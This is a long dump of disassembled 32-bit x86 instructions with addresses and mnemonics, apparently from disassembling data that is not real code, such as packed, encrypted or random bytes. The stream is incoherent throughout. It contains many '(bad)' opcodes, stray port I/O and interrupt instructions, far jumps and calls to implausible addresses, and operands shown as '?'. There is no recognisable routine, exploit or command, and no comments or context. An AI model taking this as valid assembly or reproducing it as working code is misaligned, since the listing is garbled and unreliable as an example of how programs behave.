  41dc2e:	sbb    ebx,ecx
  41dc30:	fcomp  DWORD PTR [ebx]
  41dc32:	mov    al,0xbc
  41dc34:	mov    eax,0xdc815127
  41dc39:	ret    
  41dc3a:	int    0xd
  41dc3c:	call   0x131711ee
  41dc41:	cmp    eax,0x8f0b17fb
  41dc46:	mov    cl,0xd5
  41dc48:	scas   al,BYTE PTR es:[edi]
  41dc49:	dec    eax
  41dc4a:	lahf   
  41dc4b:	or     DWORD PTR [edi*8+0x5fa1679],esp
  41dc52:	dec    esp
  41dc53:	pop    eax
  41dc54:	retf   
  41dc55:	popa   
  41dc56:	jmp    0xb4b7:0xa0fb3e48
  41dc5d:	ds push ss
  41dc5f:	ins    DWORD PTR es:[edi],dx
  41dc60:	mov    esi,0xa956980d
  41dc65:	in     al,0xe5
  41dc67:	jl     0x41dca9
  41dc69:	xchg   esp,eax
  41dc6a:	enter  0xabf4,0x1f
  41dc6e:	fldcw  WORD PTR ds:0x8284d760
  41dc74:	mov    cl,0x0
  41dc76:	into   
  41dc77:	aad    0xb9
  41dc79:	or     eax,0x92502bd6
  41dc7e:	add    DWORD PTR [ecx],eax
  41dc80:	imul   ebp,DWORD PTR [ebp-0x16],0x972e8303
  41dc87:	call   0xa6fd0521
  41dc8c:	sbb    BYTE PTR [ebp+0x640b9638],0x90
  41dc93:	add    al,0x4f
  41dc95:	sub    al,0xeb
  41dc97:	pop    esp
  41dc98:	cli    
  41dc99:	add    dl,BYTE PTR [edi+0x4]
  41dc9c:	dec    esp
  41dc9d:	ins    BYTE PTR es:[edi],dx
  41dc9e:	adc    al,BYTE PTR [edi]
  41dca0:	in     eax,dx
  41dca1:	adc    edi,DWORD PTR [edx+0x44]
  41dca4:	test   BYTE PTR [edx-0x19],dh
  41dca7:	adc    bh,bh
  41dca9:	push   ss
  41dcaa:	cmp    BYTE PTR [edx-0x35bf86ca],0x35
  41dcb1:	mov    cs:0x19b5a914,al
  41dcb7:	call   0x76ef:0xb5da8cbc
  41dcbe:	sbb    eax,0x210ca672
  41dcc3:	daa    
  41dcc4:	and    BYTE PTR [ecx+0x42],dl
  41dcc7:	push   ecx
  41dcc8:	call   0x7c7cb598
  41dccd:	ja     0x41dc99
  41dccf:	jle    0x41dd1f
  41dcd1:	cdq    
  41dcd2:	int    0x49
  41dcd4:	jle    0x41dd1e
  41dcd6:	xor    ebp,DWORD PTR [edx]
  41dcd8:	push   cs
  41dcd9:	repnz loopne 0x41dc97
  41dcdc:	push   0xffffff96
  41dcde:	mov    eax,ds:0x4118fdb6
  41dce3:	add    DWORD PTR [eax+ebp*8+0x7c],esi
  41dce7:	rcr    BYTE PTR [esi+0x7c382c07],0x57
  41dcee:	sti    
  41dcef:	sahf   
  41dcf0:	and    al,0xd
  41dcf2:	push   edx
  41dcf3:	pop    eax
  41dcf4:	ret    0xae5f
  41dcf7:	push   edx
  41dcf8:	clc    
  41dcf9:	jns    0x41dcde
  41dcfb:	jmp    0x41dca0
  41dcfd:	push   ebx
  41dcfe:	fmul   st(2),st
  41dd00:	xor    eax,0xe73d36d0
  41dd05:	fsub   DWORD PTR [edi]
  41dd07:	mov    ch,0x2b
  41dd09:	dec    ebx
  41dd0a:	adc    dl,BYTE PTR [ebp+0x1c]
  41dd0d:	in     eax,dx
  41dd0e:	inc    esi
  41dd0f:	pop    esi
  41dd10:	ins    BYTE PTR es:[edi],dx
  41dd11:	ins    DWORD PTR es:[edi],dx
  41dd12:	aaa    
  41dd13:	mov    ?,edi
  41dd15:	(bad)  
  41dd16:	sub    DWORD PTR [eax-0x3d],edi
  41dd19:	mov    esi,0xc9b6a3cc
  41dd1e:	mov    bl,0x46
  41dd20:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41dd22:	jb     0x41dd2e
  41dd24:	repz iret 
  41dd26:	stos   DWORD PTR es:[edi],eax
  41dd27:	jae    0x41dcd8
  41dd29:	cwde   
  41dd2a:	mov    dl,0x3
  41dd2c:	aaa    
  41dd2d:	int3   
  41dd2e:	adc    esp,0xffffffb1
  41dd31:	jl     0x41dcc4
  41dd33:	mov    eax,ds:0xeaeb79e
  41dd38:	cmp    ecx,DWORD PTR [ecx+0x2e800429]
  41dd3e:	pop    edi
  41dd3f:	(bad)  
  41dd40:	mov    WORD PTR ds:[edx+ebp*8-0x1525566d],es
  41dd48:	je     0x41dd91
  41dd4a:	mov    edi,0x2f0e6d14
  41dd4f:	imul   esp,ebp,0x10f7483a
  41dd55:	pop    ebp
  41dd56:	stc    
  41dd57:	mov    bh,0x83
  41dd59:	mov    ah,0x20
  41dd5b:	rcl    DWORD PTR ds:0x61c506c9,0x4e
  41dd62:	popf   
  41dd63:	mov    edx,0xee32f712
  41dd68:	js     0x41ddb2
  41dd6a:	pop    ds
  41dd6b:	inc    eax
  41dd6c:	jge    0x41dd86
  41dd6e:	sub    DWORD PTR [eax-0x76],0x52
  41dd72:	mov    al,ds:0x3ee477c1
  41dd77:	cmc    
  41dd78:	xor    eax,0x890daaec
  41dd7d:	inc    edx
  41dd7e:	add    eax,DWORD PTR [edi-0x33]
  41dd81:	jg     0x41dd7a
  41dd83:	fisttp QWORD PTR [esp+edx*1-0xe]
  41dd87:	mov    esp,0x9c3aa584
  41dd8c:	stos   DWORD PTR es:[edi],eax
  41dd8d:	add    BYTE PTR [ecx],dh
  41dd8f:	fstp   DWORD PTR [edx-0x1861e03a]
  41dd95:	inc    ebp
  41dd96:	push   ebx
  41dd97:	adc    BYTE PTR [edx],0xf5
  41dd9a:	rcl    DWORD PTR [ebp-0x54],cl
  41dd9d:	and    cl,BYTE PTR [ebx-0x6f]
  41dda0:	movq   QWORD PTR [ecx-0x74],mm0
  41dda4:	cwde   
  41dda5:	adc    BYTE PTR es:[ecx],bl
  41dda8:	jae    0x41ddfb
  41ddaa:	fistp  WORD PTR [esi-0x3a]
  41ddad:	cmp    DWORD PTR [edx],edi
  41ddaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddb0:	sti    
  41ddb1:	jmp    0x13f8:0xec31aaba
  41ddb8:	sub    ch,cl
  41ddba:	stc    
  41ddbb:	dec    ebx
  41ddbc:	fs and esp,edx
  41ddbf:	pop    eax
  41ddc0:	mov    ds:0xa6393b0f,eax
  41ddc5:	retf   
  41ddc6:	sbb    BYTE PTR [edi-0x479a2d53],bl
  41ddcc:	jg     0x41dddf
  41ddce:	inc    esi
  41ddcf:	bnd jo 0x41dd97
  41ddd2:	js     0x41dd54
  41ddd4:	mov    eax,ds:0x2bec1827
  41ddd9:	sub    dl,cl
  41dddb:	sbb    ebx,DWORD PTR [esi+0x53]
  41ddde:	push   edx
  41dddf:	dec    esi
  41dde0:	mov    ecx,fs
  41dde2:	or     esp,ecx
  41dde4:	int    0xd5
  41dde6:	or     DWORD PTR [esi],0x6d
  41dde9:	ret    0x8ca0
  41ddec:	or     ebp,DWORD PTR [ebx-0xc]
  41ddef:	add    esp,DWORD PTR [edi-0x552b664]
  41ddf5:	not    ecx
  41ddf7:	inc    esi
  41ddf8:	adc    eax,0x7d72f525
  41ddfd:	lock nop
  41ddff:	mov    cl,0x93
  41de01:	jbe    0x41de00
  41de03:	sub    ecx,edi
  41de05:	fnstenv [eax+0x30891da8]
  41de0b:	(bad)  
  41de0c:	in     al,dx
  41de0d:	ret    
  41de0e:	fs jb  0x41de0a
  41de11:	cli    
  41de12:	dec    edx
  41de13:	cmp    bl,BYTE PTR [eax]
  41de15:	leave  
  41de16:	xor    edx,DWORD PTR [esp+ebp*8]
  41de19:	mov    bl,0x43
  41de1b:	aaa    
  41de1c:	in     eax,dx
  41de1d:	(bad)  
  41de1e:	xor    edx,edx
  41de20:	sub    eax,0x62f635b0
  41de25:	jmp    0x41ddf3
  41de27:	fsubr  QWORD PTR ds:0x44908036
  41de2d:	mov    bh,0xfc
  41de2f:	xor    al,0x96
  41de31:	mov    ah,0x47
  41de33:	xchg   ebp,eax
  41de35:	fld    QWORD PTR [ebx+0x3b]
  41de38:	fisttp QWORD PTR [edx+eax*4-0x3b]
  41de3c:	push   edx
  41de3d:	mov    eax,ds:0x584ecea
  41de42:	cs mov ah,0xc8
  41de45:	push   ds
  41de46:	fmul   QWORD PTR [edx*8+0x64ea0d7c]
  41de4d:	push   esi
  41de4e:	pushf  
  41de4f:	out    dx,al
  41de50:	mov    edi,0x7bf4fcf3
  41de55:	pop    edi
  41de56:	iret   
  41de57:	ins    BYTE PTR es:[edi],dx
  41de58:	pop    esi
  41de59:	push   ebx
  41de5a:	push   0xc5549d85
  41de5f:	mov    ds:0xb26d5bef,eax
  41de64:	rol    BYTE PTR [ebx-0x32],1
  41de67:	pop    edx
  41de68:	mov    WORD PTR [ecx+edx*8+0x222a96e],?
  41de6f:	leave  
  41de70:	xchg   edi,eax
  41de71:	jp     0x41ddf7
  41de73:	mov    ds:0x595784c1,al
  41de78:	jae    0x41de3f
  41de7a:	outs   dx,BYTE PTR ds:[esi]
  41de7b:	loope  0x41de01
  41de7d:	ror    BYTE PTR [ecx+eax*8+0x270da808],1
  41de84:	retf   0x28bd
  41de87:	mov    eax,ds:0x4b760be1
  41de8c:	push   ebx
  41de8d:	(bad)  
  41de8e:	outs   dx,BYTE PTR ds:[esi]
  41de8f:	adc    DWORD PTR [edi+0x0],0xfffffff2
  41de93:	int3   
  41de94:	cmp    BYTE PTR fs:[esi-0x2dfe2c9a],0xc9
  41de9c:	mov    ebx,0x11b55ce2
  41dea1:	mov    ah,0x67
  41dea3:	push   0xffffff9e
  41dea5:	xchg   ebx,eax
  41dea6:	test   BYTE PTR [ebp+0x5c1eb117],cl
  41deac:	dec    esp
  41dead:	pop    ss
  41deae:	shl    DWORD PTR [esi],cl
  41deb0:	cmp    esp,0x70512f8f
  41deb6:	mov    dh,0x21
  41deb8:	cwde   
  41deb9:	mov    ss,esi
  41debb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41debc:	sub    BYTE PTR [edx+eax*8],ah
  41debf:	mov    ss,esp
  41dec1:	push   es
  41dec2:	inc    eax
  41dec3:	jnp    0x41deaf
  41dec5:	leave  
  41dec6:	enter  0x6aa6,0x3
  41deca:	push   ecx
  41decb:	addr16 pop ebx
  41decd:	aas    
  41dece:	add    BYTE PTR [ecx],dl
  41ded0:	sub    bl,BYTE PTR [edi]
  41ded2:	shr    BYTE PTR [ebx],1
  41ded4:	sbb    ecx,edx
  41ded6:	mov    al,BYTE PTR [esi+0x1afc8e1a]
  41dedc:	or     eax,0x14ed53ae
  41dee1:	xchg   edx,eax
  41dee2:	mov    ebx,0x4dc40223
  41dee7:	pop    ebx
  41dee8:	stos   DWORD PTR es:[edi],eax
  41dee9:	rol    esi,1
  41deeb:	xrelease xchg BYTE PTR [edi+0x68],ch
  41deef:	push   0x79
  41def1:	int3   
  41def2:	mov    ?,edi
  41def4:	mov    cl,0x11
  41def6:	(bad)  
  41def7:	cld    
  41def8:	mov    ecx,0xbf7f6908
  41defd:	sub    dh,BYTE PTR [esi+0x6d9521ca]
  41df03:	pop    ebp
  41df05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df06:	adc    dh,bl
  41df08:	xor    DWORD PTR ds:0xfd3060d7,esp
  41df0e:	inc    ebp
  41df0f:	cmp    BYTE PTR [ecx],ch
  41df11:	sti    
  41df12:	pop    eax
  41df13:	mov    DWORD PTR [edx],0xe9dd13d7
  41df19:	inc    edi
  41df1a:	loopne 0x41df73
  41df1c:	jne    0x41df82
  41df1e:	js     0x41df7a
  41df20:	ins    DWORD PTR es:[edi],dx
  41df21:	test   eax,0x3af8eff6
  41df26:	jne    0x41df8e
  41df28:	mov    ah,0xc
  41df2a:	cmp    al,0x4c
  41df2c:	int    0xab
  41df2e:	aam    0x5c
  41df30:	add    DWORD PTR [ebx-0x2a],esi
  41df33:	pop    edi
  41df34:	scas   eax,DWORD PTR es:[edi]
  41df35:	xor    al,0x74
  41df37:	dec    ecx
  41df38:	mov    BYTE PTR [eax+0x48],dl
  41df3b:	int3   
  41df3c:	stc    
  41df3d:	sub    BYTE PTR [esi+esi*1],cl
  41df40:	rcr    DWORD PTR [edi+0x31],1
  41df43:	data16 ins BYTE PTR es:[edi],dx
  41df45:	sbb    DWORD PTR [edx+0x17],0x904ae71e
  41df4c:	mov    BYTE PTR [edx+0x4f3d1f4b],bl
  41df52:	lea    edx,[eax-0x283935b6]
  41df58:	xchg   ebx,eax
  41df59:	lods   eax,DWORD PTR es:[esi]
  41df5b:	mov    dh,0xe1
  41df5d:	push   ebx
  41df5e:	pop    es
  41df5f:	clc    
  41df60:	fsub   st,st(6)
  41df62:	mov    eax,es
  41df64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df65:	lods   eax,DWORD PTR ds:[esi]
  41df66:	cmp    edi,esp
  41df68:	retf   
  41df69:	dec    esp
  41df6a:	aad    0x9
  41df6c:	xchg   ecx,eax
  41df6d:	les    ecx,FWORD PTR [esi+edx*8-0x59665c13]
  41df74:	cmp    bl,BYTE PTR [ebp+0x39]
  41df77:	mov    esp,0xf1690d22
  41df7c:	xchg   ebx,eax
  41df7d:	pushf  
  41df7e:	shr    ah,0x57
  41df81:	cdq    
  41df82:	clc    
  41df83:	dec    esp
  41df84:	(bad)  
  41df86:	mov    al,0x11
  41df88:	xor    eax,0x87ee8584
  41df8d:	aam    0xe6
  41df8f:	sbb    al,0x56
  41df91:	jmp    0xde332c4f
  41df96:	ins    DWORD PTR es:[edi],dx
  41df97:	add    al,0x7c
  41df99:	push   eax
  41df9a:	test   DWORD PTR [ebx-0x3da75aa2],ecx
  41dfa0:	jne    0x41dff3
  41dfa2:	adc    al,0x71
  41dfa4:	add    edi,DWORD PTR ds:0x3748a815
  41dfaa:	out    dx,al
  41dfab:	imul   ecx,ebp,0x61861167
  41dfb1:	xor    BYTE PTR [esi+0x48],0x96
  41dfb5:	dec    eax
  41dfb6:	push   es
  41dfb7:	cld    
  41dfb8:	repnz xor DWORD PTR ds:0xd363131a,0x52e2e952
  41dfc3:	retf   0x37eb
  41dfc6:	stos   DWORD PTR es:[edi],eax
  41dfc7:	test   eax,0xa7014068
  41dfcc:	jns    0x41e008
  41dfce:	je     0x41dfa8
  41dfd0:	push   DWORD PTR [edi-0x6f67eaf7]
  41dfd6:	js     0x41df96
  41dfd8:	push   esi
  41dfd9:	dec    edx
  41dfda:	loope  0x41e00e
  41dfdc:	pop    esi
  41dfdd:	sti    
  41dfde:	mov    eax,0x257d1119
  41dfe3:	gs dec edx
  41dfe5:	jnp    0x41df68
  41dfe7:	mov    ch,0xae
  41dfe9:	mov    eax,ds:0x1211c485
  41dfee:	mov    ch,0xc3
  41dff0:	xchg   ecx,eax
  41dff1:	dec    esi
  41dff2:	adc    eax,0x28f47fc3
  41dff7:	ins    BYTE PTR es:[edi],dx
  41dff8:	sub    eax,esi
  41dffa:	dec    ebx
  41dffb:	sbb    ebx,DWORD PTR [ecx]
  41dffd:	sub    eax,0x130d8f11
  41e002:	pop    ecx
  41e003:	fadd   st,st(1)
  41e005:	dec    ebp
  41e006:	int3   
  41e007:	xchg   DWORD PTR [eax+edx*2-0x28808dde],esp
  41e00e:	lods   al,BYTE PTR ds:[esi]
  41e00f:	mov    edx,DWORD PTR [eax-0x32]
  41e012:	pushf  
  41e013:	int3   
  41e014:	sub    DWORD PTR [esi*1+0x10ff193],eax
  41e01b:	lods   eax,DWORD PTR ds:[esi]
  41e01c:	push   edi
  41e01d:	in     al,dx
  41e01e:	inc    ecx
  41e01f:	cmp    ebx,ebx
  41e021:	sahf   
  41e022:	ja     0x41e021
  41e024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e025:	push   edx
  41e026:	js     0x41dfb1
  41e028:	add    BYTE PTR [edi-0x5d2b3840],0x72
  41e02f:	ret    
  41e030:	mov    bh,0xfb
  41e032:	jecxz  0x41e042
  41e034:	adc    ch,ch
  41e036:	cmp    cl,BYTE PTR [ecx+0x43]
  41e039:	scas   eax,DWORD PTR es:[edi]
  41e03a:	fdiv   QWORD PTR [edi-0x29]
  41e03d:	xor    esp,DWORD PTR ds:[ebx]
  41e040:	mov    ds:0x4356f894,al
  41e045:	dec    ebp
  41e046:	pop    ds
  41e047:	sbb    DWORD PTR [edi+0x3a895920],esi
  41e04d:	mov    dl,0x28
  41e04f:	xchg   edx,eax
  41e050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e051:	test   al,0x46
  41e053:	sub    bl,BYTE PTR [edi-0x6c]
  41e056:	add    DWORD PTR [eax-0x4],eax
  41e059:	xlat   BYTE PTR ds:[ebx]
  41e05a:	bnd ret 
  41e05c:	cli    
  41e05d:	adc    DWORD PTR [edx+0x76],ebp
  41e060:	mov    DWORD PTR [ebp-0x74fb5bd7],ebx
  41e066:	fs xor eax,0x5e3b8562
  41e06c:	cli    
  41e06d:	inc    esi
  41e06e:	test   al,0x1b
  41e070:	mov    al,ds:0x7e212430
  41e075:	(bad)  
  41e076:	and    al,0x47
  41e078:	or     BYTE PTR [ebp+0x3],ch
  41e07b:	fld    TBYTE PTR [edi-0x47]
  41e07e:	sbb    ebx,DWORD PTR gs:[esp+edx*4-0x19121504]
  41e086:	out    dx,al
  41e087:	xor    eax,0x73c89298
  41e08c:	cdq    
  41e08d:	in     eax,0xda
  41e08f:	sti    
  41e090:	ja     0x41e082
  41e092:	cli    
  41e093:	test   al,0xdf
  41e095:	das    
  41e096:	mov    eax,cs:0x4125793e
  41e09c:	xchg   ecx,eax
  41e09e:	repz fwait
  41e0a0:	jns    0x41e023
  41e0a2:	pop    esi
  41e0a3:	leave  
  41e0a4:	sub    eax,0x2e6378ee
  41e0a9:	dec    edi
  41e0aa:	jns    0x41e0ec
  41e0ac:	mov    dl,al
  41e0ae:	cmp    edx,ecx
  41e0b0:	cs (bad) 
  41e0b2:	jne    0x41e06b
  41e0b4:	test   eax,0x67b516bc
  41e0b9:	idiv   DWORD PTR [eax+0x25]
  41e0bc:	ret    
  41e0bd:	pop    edx
  41e0be:	shr    ch,0xf2
  41e0c1:	mov    esi,0x350e50c2
  41e0c6:	cmp    dh,bl
  41e0c8:	cs sub esi,0xffffffc7
  41e0cc:	cmp    eax,0x88087b94
  41e0d1:	mov    ebx,DWORD PTR [ebp-0x48]
  41e0d4:	jl     0x41e145
  41e0d6:	xor    al,BYTE PTR [esi]
  41e0d8:	call   ecx
  41e0da:	mov    ebp,0x64b7865c
  41e0df:	ins    DWORD PTR es:[edi],dx
  41e0e0:	sti    
  41e0e1:	rcr    eax,cl
  41e0e3:	int    0x5d
  41e0e5:	push   cs
  41e0e6:	test   al,0x39
  41e0e8:	(bad)
  41e0ec:	push   ss
  41e0ed:	xlat   BYTE PTR ds:[ebx]
  41e0ee:	or     DWORD PTR [eax],ebp
  41e0f0:	xchg   ebp,eax
  41e0f1:	push   ebx
  41e0f2:	in     al,0x33
  41e0f4:	(bad)  
  41e0f5:	loopne 0x41e131
  41e0f7:	pop    ecx
  41e0f8:	adc    al,0xe0
  41e0fa:	sbb    eax,0x8630fde5
  41e0ff:	dec    ebx
  41e100:	test   BYTE PTR [edi],dh
  41e102:	fist   WORD PTR [edi+edi*1]
  41e105:	into   
  41e106:	mov    eax,0x8ea55047
  41e10b:	adc    BYTE PTR [edi+0x7c28df00],0x9a
  41e112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e113:	retf   0x519e
  41e116:	cmp    DWORD PTR [ebp-0x27c83f8f],edi
  41e11c:	xor    esi,ebp
  41e11e:	mov    al,ds:0xbf396df
  41e123:	sub    DWORD PTR [eax],edx
  41e125:	pop    es
  41e126:	or     eax,0xea8291e2
  41e12b:	push   eax
  41e12c:	stos   DWORD PTR es:[edi],eax
  41e12d:	jns    0x41e0d8
  41e12f:	xchg   DWORD PTR [eax+0xe],esi
  41e132:	cmp    al,0xa3
  41e134:	add    al,0x32
  41e136:	add    ecx,DWORD PTR [esi+ebx*4]
  41e139:	mov    WORD PTR [esi-0x5d],cs
  41e13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e13d:	out    dx,al
  41e13e:	add    eax,0xda1fe62d
  41e143:	sub    cl,dh
  41e145:	adc    BYTE PTR [esi+0x6335e395],ah
  41e14b:	ins    DWORD PTR es:[edi],dx
  41e14c:	sbb    BYTE PTR [ecx+0x4f7793e2],al
  41e152:	mov    ?,WORD PTR [esi-0x48302fa5]
  41e158:	ret    0x1f2f
  41e15b:	inc    edi
  41e15c:	mov    ch,0xc7
  41e15e:	les    ecx,FWORD PTR [ebx]
  41e160:	pop    ecx
  41e161:	repz loopne 0x41e0ed
  41e164:	fist   DWORD PTR [ebx+ecx*4-0x3ab4587f]
  41e16b:	pop    esp
  41e16c:	mov    edi,0x986af1aa
  41e171:	pop    ss
  41e172:	xor    BYTE PTR [edx-0x64],cl
  41e175:	inc    ecx
  41e176:	hlt    
  41e177:	inc    esp
  41e178:	es mov ebp,0x86d9045c
  41e17e:	scas   eax,DWORD PTR es:[edi]
  41e17f:	shl    DWORD PTR [ecx],0x60
  41e182:	call   0xe90ef855
  41e187:	and    ah,dh
  41e189:	push   ebx
  41e18a:	(bad)  [edi+0x4f]
  41e18d:	loopne 0x41e138
  41e18f:	addr16 retf 0x1fd
  41e193:	cli    
  41e194:	sub    DWORD PTR [edi-0x19],ebp
  41e197:	loopne 0x41e131
  41e199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e19a:	out    dx,eax
  41e19b:	dec    eax
  41e19c:	or     al,0xf
  41e19e:	in     al,0xd0
  41e1a0:	push   0x8055e32d
  41e1a5:	jb     0x41e12a
  41e1a7:	inc    ebx
  41e1a8:	pusha  
  41e1a9:	enter  0x28ac,0xe6
  41e1ad:	gs pop esi
  41e1af:	int3   
  41e1b0:	je     0x41e1a7
  41e1b2:	push   ds
  41e1b3:	imul   ecx,DWORD PTR [ecx+0x294c9062],0x3786da5c
  41e1bd:	lock xchg edx,eax
  41e1bf:	adc    BYTE PTR [esi+0x40],dl
  41e1c2:	adc    WORD PTR [edx-0x33f3d153],0x74
  41e1ca:	loope  0x41e187
  41e1cc:	adc    eax,DWORD PTR [ebx]
  41e1ce:	inc    ebp
  41e1cf:	mov    dh,bl
  41e1d1:	call   0xfba7:0xe5dfd1f5
  41e1d8:	sub    DWORD PTR [ecx+0x4a],ebx
  41e1db:	ret    
  41e1dc:	sbb    edx,DWORD PTR [edx]
  41e1de:	mov    cl,0x9e
  41e1e0:	(bad)  
  41e1e1:	popf   
  41e1e2:	imul   edi,DWORD PTR [esi],0x17
  41e1e5:	jae    0x41e250
  41e1e7:	in     al,0xb7
  41e1e9:	ins    DWORD PTR es:[edi],dx
  41e1ea:	imul   edi,DWORD PTR [edi+eiz*1+0x6cf45037],0x862f0872
  41e1f5:	ficom  DWORD PTR [esi-0x75]
  41e1f8:	and    cl,dl
  41e1fa:	jle    0x41e207
  41e1fc:	xor    BYTE PTR [edx+0x7197a7db],al
  41e202:	sbb    eax,0x820ba2d5
  41e207:	jbe    0x41e1ab
  41e209:	mov    dh,0x2a
  41e20b:	ss push esi
  41e20d:	aad    0xef
  41e20f:	push   edi
  41e210:	jp     0x41e25a
  41e212:	xchg   esi,eax
  41e213:	and    al,BYTE PTR [ebp-0x14]
  41e216:	add    ah,BYTE PTR [ecx+esi*8-0x4d89d292]
  41e21d:	scas   eax,DWORD PTR es:[edi]
  41e21e:	pop    edi
  41e21f:	loop   0x41e24e
  41e221:	fist   DWORD PTR [edx+ebp*2-0x33]
  41e225:	(bad)  
  41e226:	repnz adc edx,DWORD PTR [edi+edx*8-0x5b]
  41e22b:	or     DWORD PTR [edi+0x27],esi
  41e22e:	stos   BYTE PTR es:[edi],al
  41e22f:	lock pop ss
  41e231:	fldenv [ecx]
  41e233:	sbb    edx,DWORD PTR [edi+ebp*4]
  41e236:	push   esi
  41e237:	aaa    
  41e238:	popa   
  41e239:	test   BYTE PTR [ebx],ah
  41e23b:	jbe    0x41e247
  41e23d:	cmp    DWORD PTR [eax-0x4f],ebx
  41e240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e241:	or     dl,BYTE PTR [esi]
  41e243:	push   0xf
  41e245:	mov    ecx,0x7df22c61
  41e24a:	xor    DWORD PTR ds:0xb1f161d7,0x3b7935d5
  41e254:	lahf   
  41e255:	fidiv  DWORD PTR [ecx+0x8]
  41e258:	pop    ss
  41e259:	add    edi,DWORD PTR [esp+ebx*8+0x50]
  41e25d:	cmp    ah,ch
  41e25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e260:	rcr    DWORD PTR [edi],cl
  41e262:	jns    0x41e279
  41e264:	cli    
  41e265:	imul   edx,DWORD PTR [edi],0x1
  41e268:	stos   DWORD PTR es:[edi],eax
  41e269:	cmc    
  41e26a:	or     eax,0xc267377d
  41e26f:	xchg   edi,eax
  41e270:	scas   al,BYTE PTR es:[edi]
  41e271:	inc    esp
  41e272:	fnstcw WORD PTR [edx-0x1dada309]
  41e278:	add    DWORD PTR [ebp-0x2a00a105],edi
  41e27e:	mov    ds,WORD PTR ds:0x59271254
  41e284:	dec    esi
  41e285:	repnz out 0x75,al
  41e288:	in     eax,0xe2
  41e28a:	pusha  
  41e28b:	aad    0x56
  41e28d:	ss mov bh,0xde
  41e290:	jnp    0x41e2ef
  41e292:	sub    BYTE PTR [ebp-0x5b],ch
  41e295:	sbb    eax,esp
  41e297:	fdivr  DWORD PTR [ecx]
  41e299:	push   DWORD PTR ds:0x68b85bfb
  41e29f:	aaa    
  41e2a0:	mov    ds:0xeec72ca,eax
  41e2a5:	lds    ecx,FWORD PTR [eax+ecx*2]
  41e2a8:	or     eax,0xf3ee0873
  41e2ad:	rcl    DWORD PTR [eax+edx*4+0x31c54809],1
  41e2b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2b5:	int    0x32
  41e2b7:	sub    edx,esp
  41e2b9:	mov    bl,0x90
  41e2bb:	sub    eax,0xe022367
  41e2c0:	sub    DWORD PTR [eax+0x58],0x3e108e1
  41e2c7:	adc    al,0xc2
  41e2c9:	inc    eax
  41e2ca:	or     DWORD PTR [edx+esi*2+0x258451ca],edx
  41e2d1:	ins    DWORD PTR es:[edi],dx
  41e2d2:	pop    ss
  41e2d3:	addr16 pop ebp
  41e2d5:	in     eax,0x2b
  41e2d7:	cld    
  41e2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2d9:	xor    edi,edi
  41e2db:	(bad)  
  41e2dc:	(bad)  
  41e2de:	stos   DWORD PTR es:[edi],eax
  41e2df:	sbb    al,0x23
  41e2e1:	cmp    al,0xfd
  41e2e3:	dec    esp
  41e2e4:	pop    ecx
  41e2e5:	ja     0x41e2b4
  41e2e7:	retf   
  41e2e8:	clc    
  41e2e9:	mov    DWORD PTR [ebx+eiz*4],ebx
  41e2ec:	ss imul esi,ecx,0xffffffac
  41e2f0:	icebp  
  41e2f1:	inc    edx
  41e2f2:	stos   BYTE PTR es:[edi],al
  41e2f3:	mov    edi,0x7c0d10c9
  41e2f8:	ins    BYTE PTR es:[edi],dx
  41e2f9:	add    ecx,ebx
  41e2fb:	sbb    eax,0xf1c47f69
  41e300:	jmp    0xf4f:0x57a2064e
  41e307:	and    dl,BYTE PTR [ebx-0x3d]
  41e30a:	cli    
  41e30b:	repnz push cs
  41e30d:	cmp    cl,cl
  41e30f:	mov    eax,0x37d64ea9
  41e314:	mov    dl,0x83
  41e316:	xchg   ebp,esi
  41e318:	or     al,0xb6
  41e31a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e31b:	or     al,0xd3
  41e31d:	loope  0x41e373
  41e31f:	push   esi
  41e320:	sbb    ebx,DWORD PTR [ecx-0x1b035051]
  41e326:	and    esp,DWORD PTR [ebx-0x5b1c0208]
  41e32c:	lds    edx,FWORD PTR [edi-0x1df09e84]
  41e332:	cli    
  41e333:	pop    esp
  41e334:	xchg   esp,eax
  41e335:	mul    ah
  41e337:	loop   0x41e322
  41e339:	sbb    eax,0x402a3c50
  41e33e:	(bad)
  41e341:	popa   
  41e342:	sar    DWORD PTR [edx+ebp*2],0xc5
  41e346:	test   BYTE PTR [eax+0x58054b21],0x26
  41e34d:	(bad)  
  41e34e:	and    eax,0xce88edb7
  41e353:	ss fcmovbe st,st(3)
  41e356:	lods   al,BYTE PTR ds:[esi]
  41e357:	sub    eax,0xb579305b
  41e35c:	arpl   WORD PTR [edi+0x0],di
  41e35f:	cli    
  41e360:	call   0x2aa0dfa
  41e365:	xchg   ecx,eax
  41e366:	out    0xcf,al
  41e368:	jnp    0x41e353
  41e36a:	xlat   BYTE PTR ds:[ebx]
  41e36b:	ror    DWORD PTR [edi+0x296edca4],cl
  41e371:	(bad)  
  41e372:	mov    ebp,0x3d14d20a
  41e377:	loop   0x41e3e8
  41e379:	inc    esi
  41e37a:	outs   dx,BYTE PTR ds:[esi]
  41e37b:	mov    bl,0xec
  41e37d:	pop    ss
  41e37e:	push   esp
  41e37f:	or     edi,DWORD PTR [ecx-0x4e]
  41e382:	ins    BYTE PTR es:[edi],dx
  41e383:	sub    dh,BYTE PTR [ecx-0x5c]
  41e386:	adc    eax,0xc6915af2
  41e38b:	inc    ebp
  41e38c:	push   edi
  41e38d:	mov    al,ds:0x8196952b
  41e392:	xchg   esi,eax
  41e393:	lds    esp,FWORD PTR [edx+0xc]
  41e396:	test   BYTE PTR [ebp-0x7af1f875],dh
  41e39c:	or     DWORD PTR [eax],esp
  41e39e:	add    edi,ebp
  41e3a0:	jne    0x41e3fc
  41e3a2:	(bad)  
  41e3a3:	mov    ecx,0x3a280711
  41e3a8:	adc    DWORD PTR [ebx+0x37],edx
